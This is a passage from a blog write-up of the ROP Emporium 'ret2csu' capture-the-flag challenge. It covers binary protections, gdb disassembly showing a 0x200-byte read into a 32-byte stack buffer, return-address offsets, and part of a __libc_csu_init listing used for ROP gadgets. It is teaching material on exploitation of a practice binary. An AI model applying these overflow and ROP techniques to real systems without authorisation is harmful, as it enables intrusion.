<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Ropemporium Ret2csu challenge" /><meta property="og:locale" content="en" /><meta name="description" content="We’re back in ret2win territory, but this time with no useful gadgets.How will we populate critical registers without them? The goal of this level is understanding of universal rop techniques due to limited gadgets available in the binary as compared to the ret2win challenge. The binary can be downloaded from authors website Ropemporium" /><meta property="og:description" content="We’re back in ret2win territory, but this time with no useful gadgets.How will we populate critical registers without them? The goal of this level is understanding of universal rop techniques due to limited gadgets available in the binary as compared to the ret2win challenge. The binary can be downloaded from authors website Ropemporium" /><link rel="canonical" href="https://thuri10.github.io/thuri10.github.io/posts/ropemporium-ret2csu/" /><meta property="og:url" content="https://thuri10.github.io/thuri10.github.io/posts/ropemporium-ret2csu/" /><meta property="og:site_name" content="LaByte" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-20T21:08:00+03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Ropemporium Ret2csu challenge" /><meta name="twitter:site" content="@thuri0" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-12-20T21:08:00+03:00","datePublished":"2021-12-20T21:08:00+03:00","description":"We’re back in ret2win territory, but this time with no useful gadgets.How will we populate critical registers without them? The goal of this level is understanding of universal rop techniques due to limited gadgets available in the binary as compared to the ret2win challenge. The binary can be downloaded from authors website Ropemporium","headline":"Ropemporium Ret2csu challenge","mainEntityOfPage":{"@type":"WebPage","@id":"https://thuri10.github.io/thuri10.github.io/posts/ropemporium-ret2csu/"},"url":"https://thuri10.github.io/thuri10.github.io/posts/ropemporium-ret2csu/"}</script><title>Ropemporium Ret2csu challenge | LaByte</title><link rel="apple-touch-icon" sizes="180x180" href="/thuri10.github.io/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/thuri10.github.io/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/thuri10.github.io/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/thuri10.github.io/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/thuri10.github.io/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="LaByte"><meta name="application-name" content="LaByte"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/thuri10.github.io/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/thuri10.github.io/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/thuri10.github.io/" class="mx-auto"> <img src="/thuri10.github.io/assets/images/profile.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/thuri10.github.io/">LaByte</a></div><div class="site-subtitle font-italic">Reversing Engineering and Application Security</div></div><ul class="w-100"><li class="nav-item"> <a href="/thuri10.github.io/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/thuri10.github.io/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/thuri10.github.io/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/thuri10.github.io/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/thuri10.github.io/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/thuri10" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/thuri0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['thuri783','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/thuri10.github.io/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/thuri10.github.io/"> Home </a> </span> <span>Ropemporium Ret2csu challenge</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Ropemporium Ret2csu challenge</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1640023680" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Dec 20, 2021 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/username">thuri</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2314 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><p>We’re back in ret2win territory, but this time with no useful gadgets.How will we populate critical registers without them? The goal of this level is understanding of universal rop techniques due to limited gadgets available in the binary as compared to the ret2win challenge. The binary can be downloaded from authors website <a href="https://ropemporium.com">Ropemporium</a></p><p>After downloading the binary, check enabled protections and mitigation’s. Only <strong>NX</strong> and Partial RELRO protections are turned on as shown below.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
</pre></table></code></div></div><p>First is finding the vulnerability in the binary that will enable us to subvert program execution control flow. From the disassembly of main function we are only calling <strong>pwnme</strong> function.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nb">di</span><span class="nv">sas</span> <span class="nv">main</span>
<span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">main</span><span class="p">:</span>
   <span class="err">0</span><span class="nf">x0000000000400607</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">rbp</span>
   <span class="err">0</span><span class="nf">x0000000000400608</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rbp</span><span class="p">,</span><span class="nb">rsp</span>
   <span class="err">0</span><span class="nf">x000000000040060b</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x400500</span> <span class="o">&lt;</span><span class="nv">pwnme@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x0000000000400610</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="err">0</span><span class="nf">x0000000000400615</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">pop</span>    <span class="nb">rbp</span>
   <span class="err">0</span><span class="nf">x0000000000400616</span> <span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">ret</span>
<span class="nf">End</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">dump.</span>
</pre></table></code></div></div><p>The function reference the <code class="language-plaintext highlighter-rouge">got table</code> in order to load the actual address of <code class="language-plaintext highlighter-rouge">pwnme</code> function from <strong>libret2csu.so</strong> library after the first call.</p><h2 id="pwnme-function-disassembly"><span class="mr-2">pwnme Function Disassembly</span><a href="#pwnme-function-disassembly" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nb">di</span><span class="nv">sas</span> <span class="nv">pwnme</span>
<span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">pwnme</span><span class="p">:</span>
  <span class="err">0</span><span class="nf">x000000000000093a</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">rbp</span>
  <span class="err">0</span><span class="nf">x000000000000093b</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rbp</span><span class="p">,</span><span class="nb">rsp</span>
  <span class="err">0</span><span class="nf">x000000000000093e</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">rsp</span><span class="p">,</span><span class="mh">0x20</span>
  <span class="err">0</span><span class="nf">x0000000000000942</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rax</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nv">rip</span><span class="o">+</span><span class="mh">0x201697</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x201fe0</span>
  <span class="err">0</span><span class="nf">x0000000000000949</span> <span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rax</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rax</span><span class="p">]</span>
  <span class="err">0</span><span class="nf">x000000000000094c</span> <span class="o">&lt;+</span><span class="mi">18</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">ecx</span><span class="p">,</span><span class="mh">0x0</span>
  <span class="err">0</span><span class="nf">x0000000000000951</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="mh">0x2</span>
  <span class="err">0</span><span class="nf">x0000000000000956</span> <span class="o">&lt;+</span><span class="mi">28</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">esi</span><span class="p">,</span><span class="mh">0x0</span>
  <span class="err">0</span><span class="nf">x000000000000095b</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rdi</span><span class="p">,</span><span class="nb">rax</span>
  <span class="err">0</span><span class="nf">x000000000000095e</span> <span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x820</span> <span class="o">&lt;</span><span class="nv">setvbuf@plt</span><span class="o">&gt;</span>
  <span class="err">0</span><span class="nf">x0000000000000963</span> <span class="o">&lt;+</span><span class="mi">41</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rdi</span><span class="p">,[</span><span class="nv">rip</span><span class="o">+</span><span class="mh">0x31e</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0xc88</span>
  <span class="err">0</span><span class="nf">x000000000000096a</span> <span class="o">&lt;+</span><span class="mi">48</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x7a0</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
  <span class="err">0</span><span class="nf">x000000000000096f</span> <span class="o">&lt;+</span><span class="mi">53</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rdi</span><span class="p">,[</span><span class="nv">rip</span><span class="o">+</span><span class="mh">0x32a</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0xca0</span>
  <span class="err">0</span><span class="nf">x0000000000000976</span> <span class="o">&lt;+</span><span class="mi">60</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x7a0</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
  <span class="err">0</span><span class="nf">x000000000000097b</span> <span class="o">&lt;+</span><span class="mi">65</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rax</span><span class="p">,[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x20</span><span class="p">]</span>
  <span class="err">0</span><span class="nf">x000000000000097f</span> <span class="o">&lt;+</span><span class="mi">69</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="mh">0x20</span>
  <span class="err">0</span><span class="nf">x0000000000000984</span> <span class="o">&lt;+</span><span class="mi">74</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">esi</span><span class="p">,</span><span class="mh">0x0</span>
  <span class="err">0</span><span class="nf">x0000000000000989</span> <span class="o">&lt;+</span><span class="mi">79</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rdi</span><span class="p">,</span><span class="nb">rax</span>
  <span class="err">0</span><span class="nf">x000000000000098c</span> <span class="o">&lt;+</span><span class="mi">82</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x7d0</span> <span class="o">&lt;</span><span class="nv">memset@plt</span><span class="o">&gt;</span>
  <span class="err">0</span><span class="nf">x0000000000000991</span> <span class="o">&lt;+</span><span class="mi">87</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rdi</span><span class="p">,[</span><span class="nv">rip</span><span class="o">+</span><span class="mh">0x310</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0xca8</span>
  <span class="err">0</span><span class="nf">x0000000000000998</span> <span class="o">&lt;+</span><span class="mi">94</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x7a0</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
  <span class="err">0</span><span class="nf">x000000000000099d</span> <span class="o">&lt;+</span><span class="mi">99</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rdi</span><span class="p">,[</span><span class="nv">rip</span><span class="o">+</span><span class="mh">0x36e</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0xd12</span>
  <span class="err">0</span><span class="nf">x00000000000009a4</span> <span class="o">&lt;+</span><span class="mi">106</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="mh">0x0</span>
  <span class="err">0</span><span class="nf">x00000000000009a9</span> <span class="o">&lt;+</span><span class="mi">111</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x7c0</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
  <span class="err">0</span><span class="nf">x00000000000009ae</span> <span class="o">&lt;+</span><span class="mi">116</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rax</span><span class="p">,[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x20</span><span class="p">]</span>
  <span class="err">0</span><span class="nf">x00000000000009b2</span> <span class="o">&lt;+</span><span class="mi">120</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="mh">0x200</span>
  <span class="err">0</span><span class="nf">x00000000000009b7</span> <span class="o">&lt;+</span><span class="mi">125</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rsi</span><span class="p">,</span><span class="nb">rax</span>
  <span class="err">0</span><span class="nf">x00000000000009ba</span> <span class="o">&lt;+</span><span class="mi">128</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x0</span>
  <span class="err">0</span><span class="nf">x00000000000009bf</span> <span class="o">&lt;+</span><span class="mi">133</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x7f0</span> <span class="o">&lt;</span><span class="nv">read@plt</span><span class="o">&gt;</span>
  <span class="err">0</span><span class="nf">x00000000000009c4</span> <span class="o">&lt;+</span><span class="mi">138</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rdi</span><span class="p">,[</span><span class="nv">rip</span><span class="o">+</span><span class="mh">0x34a</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0xd15</span>
  <span class="err">0</span><span class="nf">x00000000000009cb</span> <span class="o">&lt;+</span><span class="mi">145</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x7a0</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
  <span class="err">0</span><span class="nf">x00000000000009d0</span> <span class="o">&lt;+</span><span class="mi">150</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">nop</span>
  <span class="err">0</span><span class="nf">x00000000000009d1</span> <span class="o">&lt;+</span><span class="mi">151</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">leave</span>
  <span class="err">0</span><span class="nf">x00000000000009d2</span> <span class="o">&lt;+</span><span class="mi">152</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">ret</span>
<span class="nf">End</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">dump.</span>
<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span>
</pre></table></code></div></div><p>From the above disassembled code, we are reading more than the allocated buffer from the standard input, therefore leading to stack buffer overflow and corrupting the adjacent memory region. The program allocates a stack of fixed size <code class="language-plaintext highlighter-rouge">32bytes</code> and reading <strong>0x200</strong> from the standard input file descriptor, which is more than the buffer size. The c equivalent of the above vulnerability is,</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x20</span><span class="p">),</span> <span class="mh">0x200</span><span class="p">)</span> <span class="err">#</span><span class="n">reading</span> <span class="mh">0x200</span> <span class="n">from</span> <span class="n">the</span> <span class="n">stdin</span>
</pre></table></code></div></div><p>For exploitation purpose, goal is to control the return address of <code class="language-plaintext highlighter-rouge">pwnme</code> function and redirect execution to our desired address. In order to control the return address we need to fill the buffer with enough data and overflow the saved base pointer.</p><p><img data-src="/thuri10.github.io/assets/images/ropemporium/stack.png" alt="ret control" data-proofer-ignore></p><p>From the stack image layout above, we need 32 bytes to fill the buffer, 8 bytes to overwrite the saved base pointer and 8 bytes to control return address. Because the <strong>NX</strong> execution is enabled on the binary, we can`t use the shellcode techniques, therefore we use other methods such a ropping.</p><h2 id="libc_csu_init-disassembly"><span class="mr-2"><strong>libc_csu_init</strong> Disassembly</span><a href="#libc_csu_init-disassembly" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Below is the disassembled code for <strong>__libc_csu_init</strong> section for the ret2csu binary using objdump tool.objdump is a linux command line tool used for disassembling binaries.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre><span class="err">0000000000400640</span> <span class="err">&lt;</span><span class="nf">__libc_csu_init</span><span class="o">&gt;</span><span class="p">:</span>
  <span class="err">400640:</span>	<span class="err">41</span> <span class="err">57</span>                	<span class="nf">push</span>   <span class="nv">r15</span>
  <span class="err">400642:</span>	<span class="err">41</span> <span class="err">56</span>                	<span class="nf">push</span>   <span class="nv">r14</span>
  <span class="err">400644:</span>	<span class="err">49</span> <span class="err">89</span> <span class="nf">d7</span>             	<span class="nv">mov</span>    <span class="nv">r15</span><span class="p">,</span><span class="nb">rdx</span>
  <span class="err">400647:</span>	<span class="err">41</span> <span class="err">55</span>                	<span class="nf">push</span>   <span class="nv">r13</span>
  <span class="err">400649:</span>	<span class="err">41</span> <span class="err">54</span>                	<span class="nf">push</span>   <span class="nv">r12</span>
  <span class="err">40064</span><span class="nl">b:</span>	<span class="err">4</span><span class="nf">c</span> <span class="mi">8</span><span class="nv">d</span> <span class="mi">25</span> <span class="mi">9</span><span class="nv">e</span> <span class="mi">07</span> <span class="mi">20</span> <span class="mi">00</span> 	<span class="nv">lea</span>    <span class="nv">r12</span><span class="p">,[</span><span class="nv">rip</span><span class="o">+</span><span class="mh">0x20079e</span><span class="p">]</span>        <span class="err">#</span> <span class="mi">600</span><span class="nv">df0</span> <span class="o">&lt;</span><span class="nv">__frame_dummy_init_array_entry</span><span class="o">&gt;</span>
  <span class="err">400652:</span>	<span class="err">55</span>                   	<span class="nf">push</span>   <span class="nb">rbp</span>
  <span class="err">400653:</span>	<span class="err">48</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">2</span><span class="nv">d</span> <span class="mi">9</span><span class="nv">e</span> <span class="mi">07</span> <span class="mi">20</span> <span class="mi">00</span> 	<span class="nv">lea</span>    <span class="nb">rbp</span><span class="p">,[</span><span class="nv">rip</span><span class="o">+</span><span class="mh">0x20079e</span><span class="p">]</span>        <span class="err">#</span> <span class="mi">600</span><span class="nv">df8</span> <span class="o">&lt;</span><span class="nv">__do_global_dtors_aux_fini_array_entry</span><span class="o">&gt;</span>
  <span class="err">40065</span><span class="nl">a:</span>	<span class="err">53</span>                   	<span class="nf">push</span>   <span class="nb">rbx</span>
  <span class="err">40065</span><span class="nl">b:</span>	<span class="err">41</span> <span class="err">89</span> <span class="nf">fd</span>             	<span class="nv">mov</span>    <span class="nb">r13d</span><span class="p">,</span><span class="nb">edi</span>
  <span class="err">40065</span><span class="nl">e:</span>	<span class="err">49</span> <span class="err">89</span> <span class="nf">f6</span>             	<span class="nv">mov</span>    <span class="nv">r14</span><span class="p">,</span><span class="nb">rsi</span>
  <span class="err">400661:</span>	<span class="err">4</span><span class="nf">c</span> <span class="mi">29</span> <span class="nv">e5</span>             	<span class="nv">sub</span>    <span class="nb">rbp</span><span class="p">,</span><span class="nv">r12</span>
  <span class="err">400664:</span>	<span class="err">48</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">08</span>          	<span class="nv">sub</span>    <span class="nb">rsp</span><span class="p">,</span><span class="mh">0x8</span>
  <span class="err">400668:</span>	<span class="err">48</span> <span class="nf">c1</span> <span class="nv">fd</span> <span class="mi">03</span>          	<span class="nv">sar</span>    <span class="nb">rbp</span><span class="p">,</span><span class="mh">0x3</span>
  <span class="err">40066</span><span class="nl">c:</span>	<span class="nf">e8</span> <span class="mi">5</span><span class="nv">f</span> <span class="nv">fe</span> <span class="nv">ff</span> <span class="nv">ff</span>       	<span class="nv">call</span>   <span class="mi">4004</span><span class="nv">d0</span> <span class="o">&lt;</span><span class="nv">_init</span><span class="o">&gt;</span>
  <span class="err">400671:</span>	<span class="err">48</span> <span class="err">85</span> <span class="nf">ed</span>             	<span class="nv">test</span>   <span class="nb">rbp</span><span class="p">,</span><span class="nb">rbp</span>
  <span class="err">400674:</span>	<span class="err">74</span> <span class="err">20</span>                	<span class="nf">je</span>     <span class="mi">400696</span> <span class="o">&lt;</span><span class="nv">__libc_csu_init</span><span class="o">+</span><span class="mh">0x56</span><span class="o">&gt;</span>
  <span class="err">400676:</span>	<span class="err">31</span> <span class="kd">db</span>                	<span class="nv">xor</span>    <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>
